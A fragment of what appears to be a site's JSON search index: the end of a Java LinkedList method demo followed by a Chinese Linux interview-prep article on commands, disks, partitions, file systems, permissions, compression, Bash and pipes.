System.out.println(\u0026#34;LinkedList（直接输出的）: \u0026#34; + linkedList); System.out.println(\u0026#34;getFirst()获得第一个元素: \u0026#34; + linkedList.getFirst()); // 返回此列表的第一个元素  System.out.println(\u0026#34;getLast()获得第最后一个元素: \u0026#34; + linkedList.getLast()); // 返回此列表的最后一个元素  System.out.println(\u0026#34;removeFirst()删除第一个元素并返回: \u0026#34; + linkedList.removeFirst()); // 移除并返回此列表的第一个元素  System.out.println(\u0026#34;removeLast()删除最后一个元素并返回: \u0026#34; + linkedList.removeLast()); // 移除并返回此列表的最后一个元素  System.out.println(\u0026#34;After remove:\u0026#34; + linkedList); System.out.println(\u0026#34;contains()方法判断列表是否包含1这个元素:\u0026#34; + linkedList.contains(1)); // 判断此列表包含指定元素，如果是，则返回true  System.out.println(\u0026#34;该linkedList的大小 : \u0026#34; + linkedList.size()); // 返回此列表的元素个数  /************************** 位置访问操作 ************************/ System.out.println(\u0026#34;-----------------------------------------\u0026#34;); linkedList.set(1, 3); // 将此列表中指定位置的元素替换为指定的元素  System.out.println(\u0026#34;After set(1, 3):\u0026#34; + linkedList); System.out.println(\u0026#34;get(1)获得指定位置（这里为1）的元素: \u0026#34; + linkedList.get(1)); // 返回此列表中指定位置处的元素  /************************** Search操作 ************************/ System.out.println(\u0026#34;-----------------------------------------\u0026#34;); linkedList.add(3); System.out.println(\u0026#34;indexOf(3): \u0026#34; + linkedList.indexOf(3)); // 返回此列表中首次出现的指定元素的索引  System.out.println(\u0026#34;lastIndexOf(3): \u0026#34; + linkedList.lastIndexOf(3));// 返回此列表中最后出现的指定元素的索引  /************************** Queue操作 ************************/ System.out.println(\u0026#34;-----------------------------------------\u0026#34;); System.out.println(\u0026#34;peek(): \u0026#34; + linkedList.peek()); // 获取但不移除此列表的头  System.out.println(\u0026#34;element(): \u0026#34; + linkedList.element()); // 获取但不移除此列表的头  linkedList.poll(); // 获取并移除此列表的头  System.out.println(\u0026#34;After poll():\u0026#34; + linkedList); linkedList.remove(); System.out.println(\u0026#34;After remove():\u0026#34; + linkedList); // 获取并移除此列表的头  linkedList.offer(4); System.out.println(\u0026#34;After offer(4):\u0026#34; + linkedList); // 将指定元素添加到此列表的末尾  /************************** Deque操作 ************************/ System.out.println(\u0026#34;-----------------------------------------\u0026#34;); linkedList.offerFirst(2); // 在此列表的开头插入指定的元素  System.out.println(\u0026#34;After offerFirst(2):\u0026#34; + linkedList); linkedList.offerLast(5); // 在此列表末尾插入指定的元素  System.out.println(\u0026#34;After offerLast(5):\u0026#34; + linkedList); System.out.println(\u0026#34;peekFirst(): \u0026#34; + linkedList.peekFirst()); // 获取但不移除此列表的第一个元素  System.out.println(\u0026#34;peekLast(): \u0026#34; + linkedList.peekLast()); // 获取但不移除此列表的第一个元素  linkedList.pollFirst(); // 获取并移除此列表的第一个元素  System.out.println(\u0026#34;After pollFirst():\u0026#34; + linkedList); linkedList.pollLast(); // 获取并移除此列表的最后一个元素  System.out.println(\u0026#34;After pollLast():\u0026#34; + linkedList); linkedList.push(2); // 将元素推入此列表所表示的堆栈（插入到列表的头）  System.out.println(\u0026#34;After push(2):\u0026#34; + linkedList); linkedList.pop(); // 从此列表所表示的堆栈处弹出一个元素（获取并移除列表第一个元素）  System.out.println(\u0026#34;After pop():\u0026#34; + linkedList); linkedList.add(3); linkedList.removeFirstOccurrence(3); // 从此列表中移除第一次出现的指定元素（从头部到尾部遍历列表）  System.out.println(\u0026#34;After removeFirstOccurrence(3):\u0026#34; + linkedList); linkedList.removeLastOccurrence(3); // 从此列表中移除最后一次出现的指定元素（从尾部到头部遍历列表）  System.out.println(\u0026#34;After removeFirstOccurrence(3):\u0026#34; + linkedList); /************************** 遍历操作 ************************/ System.out.println(\u0026#34;-----------------------------------------\u0026#34;); linkedList.clear(); for (int i = 0; i \u0026lt; 100000; i++) { linkedList.add(i); } // 迭代器遍历  long start = System.currentTimeMillis(); Iterator\u0026lt;Integer\u0026gt; iterator = linkedList.iterator(); while (iterator.hasNext()) { iterator.next(); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;Iterator：\u0026#34; + (end - start) + \u0026#34; ms\u0026#34;); // 顺序遍历(随机遍历)  start = System.currentTimeMillis(); for (int i = 0; i \u0026lt; linkedList.size(); i++) { linkedList.get(i); } end = System.currentTimeMillis(); System.out.println(\u0026#34;for：\u0026#34; + (end - start) + \u0026#34; ms\u0026#34;); // 另一种for循环遍历  start = System.currentTimeMillis(); for (Integer i : linkedList) ; end = System.currentTimeMillis(); System.out.println(\u0026#34;for2：\u0026#34; + (end - start) + \u0026#34; ms\u0026#34;); // 通过pollFirst()或pollLast()来遍历LinkedList  LinkedList\u0026lt;Integer\u0026gt; temp1 = new LinkedList\u0026lt;\u0026gt;(); temp1.addAll(linkedList); start = System.currentTimeMillis(); while (temp1.size() != 0) { temp1.pollFirst(); } end = System.currentTimeMillis(); System.out.println(\u0026#34;pollFirst()或pollLast()：\u0026#34; + (end - start) + \u0026#34; ms\u0026#34;); // 通过removeFirst()或removeLast()来遍历LinkedList  LinkedList\u0026lt;Integer\u0026gt; temp2 = new LinkedList\u0026lt;\u0026gt;(); temp2.addAll(linkedList); start = System.currentTimeMillis(); while (temp2.size() != 0) { temp2.removeFirst(); } end = System.currentTimeMillis(); System.out.println(\u0026#34;removeFirst()或removeLast()：\u0026#34; + (end - start) + \u0026#34; ms\u0026#34;); } } "},{"id":259,"href":"/%E7%AC%94%E8%AE%B0/Linux/","title":"Linux","parent":"笔记","content":"Linux     Linux  前言 一、常用操作以及概念  快捷键 求助 关机 PATH sudo 包管理工具 发行版 VIM 三个模式 GNU 开源协议   二、磁盘  磁盘接口 磁盘的文件名   三、分区  分区表 开机检测程序   四、文件系统  分区与文件系统 组成 文件读取 磁盘碎片 block inode 目录 日志 挂载 目录配置   五、文件  文件属性 文件与目录的基本操作 修改权限 默认权限 目录的权限 链接 获取文件内容 指令与文件搜索   六、压缩与打包  压缩文件名 压缩指令 打包   七、Bash  特性 变量操作 指令搜索顺序 数据流重定向   八、管道指令  提取指令 排序指令 双向输出重定向 字符转换指令 分区指令   九、正则表达式  grep printf awk   十、进程管理  查看进程 进程状态 SIGCHLD wait() waitpid() 孤儿进程 僵尸进程   参考资料    前言    为了便于理解，本文从常用操作和概念开始讲起。虽然已经尽量做到简化，但是涉及到的内容还是有点多。在面试中，Linux 知识点相对于网络和操作系统等知识点而言不是那么重要，只需要重点掌握一些原理和命令即可。为了方便大家准备面试，在此先将一些比较重要的知识点列出来：\n 能简单使用 cat，grep，cut 等命令进行一些操作； 文件系统相关的原理，inode 和 block 等概念，数据恢复； 硬链接与软链接； 进程管理相关，僵尸进程与孤儿进程，SIGCHLD 。  一、常用操作以及概念    快捷键     Tab：命令和文件名补全； Ctrl+C：中断正在运行的程序； Ctrl+D：结束键盘输入（End Of File，EOF）  求助    1. \u0026ndash;help    指令的基本用法与选项介绍。\n2. man    man 是 manual 的缩写，将指令的具体信息显示出来。\n当执行 man date 时，有 DATE(1) 出现，其中的数字代表指令的类型，常用的数字及其类型如下：\n   代号 类型     1 用户在 shell 环境中可以操作的指令或者可执行文件   5 配置文件   8 系统管理员可以使用的管理指令    3. info    info 与 man 类似，但是 info 将文档分成一个个页面，每个页面可以跳转。\n4. doc    /usr/share/doc 存放着软件的一整套说明文件。\n关机    1. who    在关机前需要先使用 who 命令查看有没有其它用户在线。\n2. sync    为了加快对磁盘文件的读写速度，位于内存中的文件数据不会立即同步到磁盘，因此关机之前需要先进行 sync 同步操作。\n3. shutdown    ## shutdown [-krhc] 时间 [信息] -k ： 不会关机，只是发送警告信息，通知所有在线的用户 -r ： 将系统的服务停掉后就重新启动 -h ： 将系统的服务停掉后就立即关机 -c ： 取消已经在进行的 shutdown PATH    可以在环境变量 PATH 中声明可执行文件的路径，路径之间用 : 分隔。\n/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/dmtsai/.local/bin:/home/dmtsai/bin sudo    sudo 允许一般用户使用 root 可执行的命令，不过只有在 /etc/sudoers 配置文件中添加的用户才能使用该指令。\n包管理工具    RPM 和 DPKG 为最常见的两类软件包管理工具：\n RPM 全称为 Redhat Package Manager，最早由 Red Hat 公司制定实施，随后被 GNU 开源操作系统接受并成为许多 Linux 系统的既定软件标准。YUM 基于 RPM，具有依赖管理和软件升级功能。 与 RPM 竞争的是基于 Debian 操作系统的 DEB 软件包管理工具 DPKG，全称为 Debian Package，功能方面与 RPM 相似。  发行版    Linux 发行版是 Linux 内核及各种应用软件的集成版本。\n   基于的包管理工具 商业发行版 社区发行版     RPM Red Hat Fedora / CentOS   DPKG Ubuntu Debian    VIM 三个模式    \n 一般指令模式（Command mode）：VIM 的默认模式，可以用于移动游标查看内容； 编辑模式（Insert mode）：按下 \u0026ldquo;i\u0026rdquo; 等按键之后进入，可以对文本进行编辑； 指令列模式（Bottom-line mode）：按下 \u0026ldquo;:\u0026rdquo; 按键之后进入，用于保存退出等操作。  在指令列模式下，有以下命令用于离开或者保存文件。\n   命令 作用     :w 写入磁盘   :w! 当文件为只读时，强制写入磁盘。到底能不能写入，与用户对该文件的权限有关   :q 离开   :q! 强制离开不保存   :wq 写入磁盘后离开   :wq! 强制写入磁盘后离开    GNU    GNU 计划，译为革奴计划，它的目标是创建一套完全自由的操作系统，称为 GNU，其内容软件完全以 GPL 方式发布。其中 GPL 全称为 GNU 通用公共许可协议（GNU General Public License），包含了以下内容：\n 以任何目的运行此程序的自由； 再复制的自由； 改进此程序，并公开发布改进的自由。  开源协议     Choose an open source license 如何选择开源许可证？  二、磁盘    磁盘接口    1. IDE    IDE（ATA）全称 Advanced Technology Attachment，接口速度最大为 133MB/s，因为并口线的抗干扰性太差，且排线占用空间较大，不利电脑内部散热，已逐渐被 SATA 所取代。\n\n2. SATA    SATA 全称 Serial ATA，也就是使用串口的 ATA 接口，抗干扰性强，且对数据线的长度要求比 ATA 低很多，支持热插拔等功能。SATA-II 的接口速度为 300MB/s，而 SATA-III 标准可达到 600MB/s 的传输速度。SATA 的数据线也比 ATA 的细得多，有利于机箱内的空气流通，整理线材也比较方便。\n\n3. SCSI    SCSI 全称是 Small Computer System Interface（小型机系统接口），SCSI 硬盘广为工作站以及个人电脑以及服务器所使用，因此会使用较为先进的技术，如碟片转速 15000rpm 的高转速，且传输时 CPU 占用率较低，但是单价也比相同容量的 ATA 及 SATA 硬盘更加昂贵。\n\n4. SAS    SAS（Serial Attached SCSI）是新一代的 SCSI 技术，和 SATA 硬盘相同，都是采取序列式技术以获得更高的传输速度，可达到 6Gb/s。此外也通过缩小连接线改善系统内部空间等。\n\n磁盘的文件名    Linux 中每个硬件都被当做一个文件，包括磁盘。磁盘以磁盘接口类型进行命名，常见磁盘的文件名如下：\n IDE 磁盘：/dev/hd[a-d] SATA/SCSI/SAS 磁盘：/dev/sd[a-p]  其中文件名后面的序号的确定与系统检测到磁盘的顺序有关，而与磁盘所插入的插槽位置无关。\n三、分区    分区表    磁盘分区表主要有两种格式，一种是限制较多的 MBR 分区表，一种是较新且限制较少的 GPT 分区表。\n1. MBR    MBR 中，第一个扇区最重要，里面有主要开机记录（Master boot record, MBR）及分区表（partition table），其中主要开机记录占 446 bytes，分区表占 64 bytes。\n分区表只有 64 bytes，最多只能存储 4 个分区，这 4 个分区为主分区（Primary）和扩展分区（Extended）。其中扩展分区只有一个，它使用其它扇区来记录额外的分区表，因此通过扩展分区可以分出更多分区，这些分区称为逻辑分区。\nLinux 也把分区当成文件，分区文件的命名方式为：磁盘文件名 + 编号，例如 /dev/sda1。注意，逻辑分区的编号从 5 开始。\n2. GPT    扇区是磁盘的最小存储单位，旧磁盘的扇区大小通常为 512 bytes，而最新的磁盘支持 4 k。GPT 为了兼容所有磁盘，在定义扇区上使用逻辑区块地址（Logical Block Address, LBA），LBA 默认大小为 512 bytes。\nGPT 第 1 个区块记录了主要开机记录（MBR），紧接着是 33 个区块记录分区信息，并把最后的 33 个区块用于对分区信息进行备份。这 33 个区块第一个为 GPT 表头纪录，这个部份纪录了分区表本身的位置与大小和备份分区的位置，同时放置了分区表的校验码 (CRC32)，操作系统可以根据这个校验码来判断 GPT 是否正确。若有错误，可以使用备份分区进行恢复。\nGPT 没有扩展分区概念，都是主分区，每个 LBA 可以分 4 个分区，因此总共可以分 4 * 32 = 128 个分区。\nMBR 不支持 2.2 TB 以上的硬盘，GPT 则最多支持到 233 TB = 8 ZB。\n\n开机检测程序    1. BIOS    BIOS（Basic Input/Output System，基本输入输出系统），它是一个固件（嵌入在硬件中的软件），BIOS 程序存放在断电后内容不会丢失的只读内存中。\n\nBIOS 是开机的时候计算机执行的第一个程序，这个程序知道可以开机的磁盘，并读取磁盘第一个扇区的主要开机记录（MBR），由主要开机记录（MBR）执行其中的开机管理程序，这个开机管理程序会加载操作系统的核心文件。\n主要开机记录（MBR）中的开机管理程序提供以下功能：选单、载入核心文件以及转交其它开机管理程序。转交这个功能可以用来实现多重引导，只需要将另一个操作系统的开机管理程序安装在其它分区的启动扇区上，在启动开机管理程序时，就可以通过选单选择启动当前的操作系统或者转交给其它开机管理程序从而启动另一个操作系统。\n下图中，第一扇区的主要开机记录（MBR）中的开机管理程序提供了两个选单：M1、M2，M1 指向了 Windows 操作系统，而 M2 指向其它分区的启动扇区，里面包含了另外一个开机管理程序，提供了一个指向 Linux 的选单。\n\n安装多重引导，最好先安装 Windows 再安装 Linux。因为安装 Windows 时会覆盖掉主要开机记录（MBR），而 Linux 可以选择将开机管理程序安装在主要开机记录（MBR）或者其它分区的启动扇区，并且可以设置开机管理程序的选单。\n2. UEFI    BIOS 不可以读取 GPT 分区表，而 UEFI 可以。\n四、文件系统    分区与文件系统    对分区进行格式化是为了在分区上建立文件系统。一个分区通常只能格式化为一个文件系统，但是磁盘阵列等技术可以将一个分区格式化为多个文件系统。\n组成    最主要的几个组成部分如下：\n inode：一个文件占用一个 inode，记录文件的属性，同时记录此文件的内容所在的 block 编号； block：记录文件的内容，文件太大时，会占用多个 block。  除此之外还包括：\n superblock：记录文件系统的整体信息，包括 inode 和 block 的总量、使用量、剩余量，以及文件系统的格式与相关信息等； block bitmap：记录 block 是否被使用的位图。  \n文件读取    对于 Ext2 文件系统，当要读取一个文件的内容时，先在 inode 中查找文件内容所在的所有 block，然后把所有 block 的内容读出来。\n\n而对于 FAT 文件系统，它没有 inode，每个 block 中存储着下一个 block 的编号。\n\n磁盘碎片    指一个文件内容所在的 block 过于分散，导致磁盘磁头移动距离过大，从而降低磁盘读写性能。\nblock    在 Ext2 文件系统中所支持的 block 大小有 1K，2K 及 4K 三种，不同的大小限制了单个文件和文件系统的最大大小。\n   大小 1KB 2KB 4KB     最大单一文件 16GB 256GB 2TB   最大文件系统 2TB 8TB 16TB    一个 block 只能被一个文件所使用，未使用的部分直接浪费了。因此如果需要存储大量的小文件，那么最好选用比较小的 block。\ninode    inode 具体包含以下信息：\n 权限 (read/write/excute)； 拥有者与群组 (owner/group)； 容量； 建立或状态改变的时间 (ctime)； 最近读取时间 (atime)； 最近修改时间 (mtime)； 定义文件特性的旗标 (flag)，如 SetUID\u0026hellip;； 该文件真正内容的指向 (pointer)。  inode 具有以下特点：\n 每个 inode 大小均固定为 128 bytes (新的 ext4 与 xfs 可设定到 256 bytes)； 每个文件都仅会占用一个 inode。  inode 中记录了文件内容所在的 block 编号，但是每个 block 非常小，一个大文件随便都需要几十万的 block。而一个 inode 大小有限，无法直接引用这么多 block 编号。因此引入了间接、双间接、三间接引用。间接引用让 inode 记录的引用 block 块记录引用信息。\n\n目录    建立一个目录时，会分配一个 inode 与至少一个 block。block 记录的内容是目录下所有文件的 inode 编号以及文件名。\n可以看到文件的 inode 本身不记录文件名，文件名记录在目录中，因此新增文件、删除文件、更改文件名这些操作与目录的写权限有关。\n日志    如果突然断电，那么文件系统会发生错误，例如断电前只修改了 block bitmap，而还没有将数据真正写入 block 中。\next3/ext4 文件系统引入了日志功能，可以利用日志来修复文件系统。\n挂载    挂载利用目录作为文件系统的进入点，也就是说，进入目录之后就可以读取文件系统的数据。\n目录配置    为了使不同 Linux 发行版本的目录结构保持一致性，Filesystem Hierarchy Standard (FHS) 规定了 Linux 的目录结构。最基础的三个目录如下：\n / (root, 根目录) /usr (unix software resource)：所有系统默认软件都会安装到这个目录； /var (variable)：存放系统或程序运行过程中的数据文件。  \n五、文件    文件属性    用户分为三种：文件拥有者、群组以及其它人，对不同的用户有不同的文件权限。\n使用 ls 查看一个文件时，会显示一个文件的信息，例如 drwxr-xr-x 3 root root 17 May 6 00:14 .config，对这个信息的解释如下：\n drwxr-xr-x：文件类型以及权限，第 1 位为文件类型字段，后 9 位为文件权限字段 3：链接数 root：文件拥有者 root：所属群组 17：文件大小 May 6 00:14：文件最后被修改的时间 .config：文件名  常见的文件类型及其含义有：\n d：目录 -：文件 l：链接文件  9 位的文件权限字段中，每 3 个为一组，共 3 组，每一组分别代表对文件拥有者、所属群组以及其它人的文件权限。一组权限中的 3 位分别为 r、w、x 权限，表示可读、可写、可执行。\n文件时间有以下三种：\n modification time (mtime)：文件的内容更新就会更新； status time (ctime)：文件的状态（权限、属性）更新就会更新； access time (atime)：读取文件时就会更新。  文件与目录的基本操作    1. ls    列出文件或者目录的信息，目录的信息就是其中包含的文件。\n## ls [-aAdfFhilnrRSt] file|dir -a ：列出全部的文件 -d ：仅列出目录本身 -l ：以长数据串行列出，包含文件的属性与权限等等数据 2. cd    更换当前目录。\ncd [相对路径或绝对路径] 3. mkdir    创建目录。\n## mkdir [-mp] 目录名称 -m ：配置目录权限 -p ：递归创建目录 4. rmdir    删除目录，目录必须为空。\nrmdir [-p] 目录名称 -p ：递归删除目录 5. touch    更新文件时间或者建立新文件。\n## touch [-acdmt] filename -a ： 更新 atime -c ： 更新 ctime，若该文件不存在则不建立新文件 -m ： 更新 mtime -d ： 后面可以接更新日期而不使用当前日期，也可以使用 --date=\u0026#34;日期或时间\u0026#34; -t ： 后面可以接更新时间而不使用当前时间，格式为[YYYYMMDDhhmm] 6. cp    复制文件。如果源文件有两个以上，则目的文件一定要是目录才行。\ncp [-adfilprsu] source destination -a ：相当于 -dr --preserve=all -d ：若来源文件为链接文件，则复制链接文件属性而非文件本身 -i ：若目标文件已经存在时，在覆盖前会先询问 -p ：连同文件的属性一起复制过去 -r ：递归复制 -u ：destination 比 source 旧才更新 destination，或 destination 不存在的情况下才复制 --preserve=all ：除了 -p 的权限相关参数外，还加入 SELinux 的属性, links, xattr 等也复制了 7. rm    删除文件。\n## rm [-fir] 文件或目录 -r ：递归删除 8. mv    移动文件。\n## mv [-fiu] source destination ## mv [options] source1 source2 source3 .... directory -f ： force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖 修改权限    可以将一组权限用数字来表示，此时一组权限的 3 个位当做二进制数字的位，从左到右每个位的权值为 4、2、1，即每个权限对应的数字权值为 r : 4、w : 2、x : 1。\n## chmod [-R] xyz dirname/filename 示例：将 .bashrc 文件的权限修改为 -rwxr-xr\u0026ndash;。\n## chmod 754 .bashrc 也可以使用符号来设定权限。\n## chmod [ugoa] [+-=] [rwx] dirname/filename - u：拥有者 - g：所属群组 - o：其他人 - a：所有人 - +：添加权限 - -：移除权限 - =：设定权限 示例：为 .bashrc 文件的所有用户添加写权限。\n## chmod a+w .bashrc 默认权限     文件默认权限：文件默认没有可执行权限，因此为 666，也就是 -rw-rw-rw- 。 目录默认权限：目录必须要能够进入，也就是必须拥有可执行权限，因此为 777 ，也就是 drwxrwxrwx。  可以通过 umask 设置或者查看默认权限，通常以掩码的形式来表示，例如 002 表示其它用户的权限去除了一个 2 的权限，也就是写权限，因此建立新文件时默认的权限为 -rw-rw-r\u0026ndash;。\n目录的权限    文件名不是存储在一个文件的内容中，而是存储在一个文件所在的目录中。因此，拥有文件的 w 权限并不能对文件名进行修改。\n目录存储文件列表，一个目录的权限也就是对其文件列表的权限。因此，目录的 r 权限表示可以读取文件列表；w 权限表示可以修改文件列表，具体来说，就是添加删除文件，对文件名进行修改；x 权限可以让该目录成为工作目录，x 权限是 r 和 w 权限的基础，如果不能使一个目录成为工作目录，也就没办法读取文件列表以及对文件列表进行修改了。\n链接    \n## ln [-sf] source_filename dist_filename -s ：默认是实体链接，加 -s 为符号链接 -f ：如果目标文件存在时，先删除目标文件 1. 实体链接    在目录下创建一个条目，记录着文件名与 inode 编号，这个 inode 就是源文件的 inode。\n删除任意一个条目，文件还是存在，只要引用数量不为 0。\n有以下限制：不能跨越文件系统、不能对目录进行链接。\n## ln /etc/crontab . ## ll -i /etc/crontab crontab 34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 crontab 34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab 2. 符号链接    符号链接文件保存着源文件所在的绝对路径，在读取时会定位到源文件上，可以理解为 Windows 的快捷方式。\n当源文件被删除了，链接文件就打不开了。\n因为记录的是路径，所以可以为目录建立符号链接。\n## ll -i /etc/crontab /root/crontab2 34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab 53745909 lrwxrwxrwx. 1 root root 12 Jun 23 22:31 /root/crontab2 -\u0026gt; /etc/crontab 获取文件内容    1. cat    取得文件内容。\n## cat [-AbEnTv] filename -n ：打印出行号，连同空白行也会有行号，-b 不会 2. tac    是 cat 的反向操作，从最后一行开始打印。\n3. more    和 cat 不同的是它可以一页一页查看文件内容，比较适合大文件的查看。\n4. less    和 more 类似，但是多了一个向前翻页的功能。\n5. head    取得文件前几行。\n## head [-n number] filename -n ：后面接数字，代表显示几行的意思 6. tail    是 head 的反向操作，只是取得是后几行。\n7. od    以字符或者十六进制的形式显示二进制文件。\n指令与文件搜索    1. which    指令搜索。\n## which [-a] command -a ：将所有指令列出，而不是只列第一个 2. whereis    文件搜索。速度比较快，因为它只搜索几个特定的目录。\n## whereis [-bmsu] dirname/filename 3. locate    文件搜索。可以用关键字或者正则表达式进行搜索。\nlocate 使用 /var/lib/mlocate/ 这个数据库来进行搜索，它存储在内存中，并且每天更新一次，所以无法用 locate 搜索新建的文件。可以使用 updatedb 来立即更新数据库。\n## locate [-ir] keyword -r：正则表达式 4. find    文件搜索。可以使用文件的属性和权限进行搜索。\n## find [basedir] [option] example: find . -name \u0026#34;shadow*\u0026#34; ① 与时间有关的选项\n-mtime n ：列出在 n 天前的那一天修改过内容的文件 -mtime +n ：列出在 n 天之前 (不含 n 天本身) 修改过内容的文件 -mtime -n ：列出在 n 天之内 (含 n 天本身) 修改过内容的文件 -newer file ： 列出比 file 更新的文件 +4、4 和 -4 的指示的时间范围如下：\n\n② 与文件拥有者和所属群组有关的选项\n-uid n -gid n -user name -group name -nouser ：搜索拥有者不存在 /etc/passwd 的文件 -nogroup：搜索所属群组不存在于 /etc/group 的文件 ③ 与文件权限和名称有关的选项\n-name filename -size [+-]SIZE：搜寻比 SIZE 还要大 (+) 或小 (-) 的文件。这个 SIZE 的规格有：c: 代表 byte，k: 代表 1024bytes。所以，要找比 50KB 还要大的文件，就是 -size +50k -type TYPE -perm mode ：搜索权限等于 mode 的文件 -perm -mode ：搜索权限包含 mode 的文件 -perm /mode ：搜索权限包含任一 mode 的文件 六、压缩与打包    压缩文件名    Linux 底下有很多压缩文件名，常见的如下：\n   扩展名 压缩程序     *.Z compress   *.zip zip   *.gz gzip   *.bz2 bzip2   *.xz xz   *.tar tar 程序打包的数据，没有经过压缩   *.tar.gz tar 程序打包的文件，经过 gzip 的压缩   *.tar.bz2 tar 程序打包的文件，经过 bzip2 的压缩   *.tar.xz tar 程序打包的文件，经过 xz 的压缩    压缩指令    1. gzip    gzip 是 Linux 使用最广的压缩指令，可以解开 compress、zip 与 gzip 所压缩的文件。\n经过 gzip 压缩过，源文件就不存在了。\n有 9 个不同的压缩等级可以使用。\n可以使用 zcat、zmore、zless 来读取压缩文件的内容。\n$ gzip [-cdtv#] filename -c ：将压缩的数据输出到屏幕上 -d ：解压缩 -t ：检验压缩文件是否出错 -v ：显示压缩比等信息 -# ： # 为数字的意思，代表压缩等级，数字越大压缩比越高，默认为 6 2. bzip2    提供比 gzip 更高的压缩比。\n查看命令：bzcat、bzmore、bzless、bzgrep。\n$ bzip2 [-cdkzv#] filename -k ：保留源文件 3. xz    提供比 bzip2 更佳的压缩比。\n可以看到，gzip、bzip2、xz 的压缩比不断优化。不过要注意的是，压缩比越高，压缩的时间也越长。\n查看命令：xzcat、xzmore、xzless、xzgrep。\n$ xz [-dtlkc#] filename 打包    压缩指令只能对一个文件进行压缩，而打包能够将多个文件打包成一个大文件。tar 不仅可以用于打包，也可以使用 gzip、bzip2、xz 将打包文件进行压缩。\n$ tar [-z|-j|-J] [cv] [-f 新建的 tar 文件] filename... ==打包压缩 $ tar [-z|-j|-J] [tv] [-f 已有的 tar 文件] ==查看 $ tar [-z|-j|-J] [xv] [-f 已有的 tar 文件] [-C 目录] ==解压缩 -z ：使用 zip； -j ：使用 bzip2； -J ：使用 xz； -c ：新建打包文件； -t ：查看打包文件里面有哪些文件； -x ：解打包或解压缩的功能； -v ：在压缩/解压缩的过程中，显示正在处理的文件名； -f : filename：要处理的文件； -C 目录 ： 在特定目录解压缩。    使用方式 命令     打包压缩 tar -jcv -f filename.tar.bz2 要被压缩的文件或目录名称   查 看 tar -jtv -f filename.tar.bz2   解压缩 tar -jxv -f filename.tar.bz2 -C 要解压缩的目录    七、Bash    可以通过 Shell 请求内核提供服务，Bash 正是 Shell 的一种。\n特性     命令历史：记录使用过的命令 命令与文件补全：快捷键：tab 命名别名：例如 ll 是 ls -al 的别名 shell scripts 通配符：例如 ls -l /usr/bin/X* 列出 /usr/bin 下面所有以 X 开头的文件  变量操作    对一个变量赋值直接使用 =。\n对变量取用需要在变量前加上 $ ，也可以用 ${} 的形式；\n输出变量使用 echo 命令。\n$ x=abc $ echo $x $ echo ${x} 变量内容如果有空格，必须使用双引号或者单引号。\n 双引号内的特殊字符可以保留原本特性，例如 x=\u0026ldquo;lang is $LANG\u0026rdquo;，则 x 的值为 lang is zh_TW.UTF-8； 单引号内的特殊字符就是特殊字符本身，例如 x=\u0026lsquo;lang is $LANG\u0026rsquo;，则 x 的值为 lang is $LANG。  可以使用 `指令` 或者 $(指令) 的方式将指令的执行结果赋值给变量。例如 version=$(uname -r)，则 version 的值为 4.15.0-22-generic。\n可以使用 export 命令将自定义变量转成环境变量，环境变量可以在子程序中使用，所谓子程序就是由当前 Bash 而产生的子 Bash。\nBash 的变量可以声明为数组和整数数字。注意数字类型没有浮点数。如果不进行声明，默认是字符串类型。变量的声明使用 declare 命令：\n$ declare [-aixr] variable -a ： 定义为数组类型 -i ： 定义为整数类型 -x ： 定义为环境变量 -r ： 定义为 readonly 类型 使用 [ ] 来对数组进行索引操作：\n$ array[1]=a $ array[2]=b $ echo ${array[1]} 指令搜索顺序     以绝对或相对路径来执行指令，例如 /bin/ls 或者 ./ls ； 由别名找到该指令来执行； 由 Bash 内置的指令来执行； 按 $PATH 变量指定的搜索路径的顺序找到第一个指令来执行。  数据流重定向    重定向指的是使用文件代替标准输入、标准输出和标准错误输出。\n   1 代码 运算符     标准输入 (stdin) 0 \u0026lt; 或 \u0026lt;\u0026lt;   标准输出 (stdout) 1 \u0026gt; 或 \u0026gt;\u0026gt;   标准错误输出 (stderr) 2 2\u0026gt; 或 2\u0026gt;\u0026gt;    其中，有一个箭头的表示以覆盖的方式重定向，而有两个箭头的表示以追加的方式重定向。\n可以将不需要的标准输出以及标准错误输出重定向到 /dev/null，相当于扔进垃圾箱。\n如果需要将标准输出以及标准错误输出同时重定向到一个文件，需要将某个输出转换为另一个输出，例如 2\u0026gt;\u0026amp;1 表示将标准错误输出转换为标准输出。\n$ find /home -name .bashrc \u0026gt; list 2\u0026gt;\u0026amp;1 八、管道指令    管道是将一个命令的标准输出作为另一个命令的标准输入，在数据需要经过多个步骤的处理之后才能得到我们想要的内容时就可以使用管道。\n在命令之间使用 | 分隔各个管道命令。\n$ ls -al /etc | less 提取指令    cut 对数据进行切分，取出想要的部分。\n切分过程一行一行地进行。\n$ cut -d ：分隔符 -f ：经过 -d 分隔后，使用 -f n 取出第 n 个区间 -c ：以字符为单位取出区间 示例 1：last 显示登入者的信息，取出用户名。\n$ last root pts/1 192.168.201.101 Sat Feb 7 12:35 still logged in root pts/1 192.168.201.101 Fri Feb 6 12:13 - 18:46 (06:33) root pts/1 192.168.201.254 Thu Feb 5 22:37 - 23:53 (01:16) $ last | cut -d \u0026#39; \u0026#39; -f 1 示例 2：将 export 输出的信息，取出第 12 字符以后的所有字符串。\n$ export declare -x HISTCONTROL=\u0026#34;ignoredups\u0026#34; declare -x HISTSIZE=\u0026#34;1000\u0026#34; declare -x HOME=\u0026#34;/home/dmtsai\u0026#34; declare -x HOSTNAME=\u0026#34;study.centos.vbird\u0026#34; .....(其他省略)..... $ export | cut -c 12- 排序指令    sort 用于排序。\n$ sort [-fbMnrtuk] [file or stdin] -f ：忽略大小写 -b ：忽略最前面的空格 -M ：以月份的名字来排序，例如 JAN，DEC -n ：使用数字 -r ：反向排序 -u ：相当于 unique，重复的内容只出现一次 -t ：分隔符，默认为 tab -k ：指定排序的区间 示例：/etc/passwd 文件内容以 : 来分隔，要求以第三列进行排序。\n$ cat /etc/passwd | sort -t \u0026#39;:\u0026#39; -k 3 root:x:0:0:root:/root:/bin/bash dmtsai:x:1000:1000:dmtsai:/home/dmtsai:/bin/bash alex:x:1001:1002::/home/alex:/bin/bash arod:x:1002:1003::/home/arod:/bin/bash uniq 可以将重复的数据只取一个。\n$ uniq [-ic] -i ：忽略大小写 -c ：进行计数 示例：取得每个人的登录总次数\n$ last | cut -d \u0026#39; \u0026#39; -f 1 | sort | uniq -c 1 6 (unknown 47 dmtsai 4 reboot 7 root 1 wtmp 